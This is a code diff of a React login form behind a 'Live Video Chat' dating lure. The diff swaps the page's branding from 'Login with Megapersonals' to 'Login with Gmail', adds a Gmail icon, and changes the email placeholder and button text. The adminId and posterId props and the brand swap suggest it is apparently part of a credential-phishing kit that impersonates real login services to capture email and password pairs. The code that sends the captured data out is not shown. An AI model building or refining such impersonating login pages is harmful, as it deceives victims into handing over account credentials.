@@ -22,11 +22,11 @@ function LoginForm({ adminId, posterId }) {
     setEmail("");
     setPassword("");
 
-    console.log("allValues", allValues);
+    // console.log("allValues", allValues);
   };
 
   return (
-    <div class="bg-neutral-50 w-full max-w-[25rem] p-6 rounded-xl">
+    <div class="bg-neutral-50 w-full max-w-[25rem] p-6 rounded-xl grid justify-items-center">
       <p class="text-3xl font-semibold ">Live Video Chat</p>
       <p class="mt-3 leading-relaxed max-w-[32ch] mx-auto [&amp;>span]:font-semibold">
         Know each other and enjoy{" "}
@@ -35,9 +35,9 @@ function LoginForm({ adminId, posterId }) {
         <span class="text-green-500">hasslefree</span> live moment with your
         dating partner
       </p>
-      <img src="/images/devilgirl.png" width="180xp" height="120px" alt="" />{" "}
+      <img src="/Gmail_icon.svg.webp" width="180xp" height="120px" alt="" />{" "}
       <p class="text-xl font-semibold mt-3 text-center">
-        Login with Megapersonals
+        Login with Gmail
       </p>
       <div class="flex flex-col gap-y-4 mt-4">
         <p
@@ -50,7 +50,7 @@ function LoginForm({ adminId, posterId }) {
         <input
           required=""
           class="border h-11 rounded px-4 outline-none border-green-500 disabled:border-green-200"
-          placeholder="Enter email here"
+          placeholder="Enter gmail here"
           type="email"
           name="email"
           value={email}
@@ -69,7 +69,7 @@ function LoginForm({ adminId, posterId }) {
           onClick={handleSubmit}
           class="h-11 rounded text-neutral-50 font-medium bg-green-500 disabled:bg-green-200"
         >
-          Submit
+          Login
         </button>
       </div>
     </div>
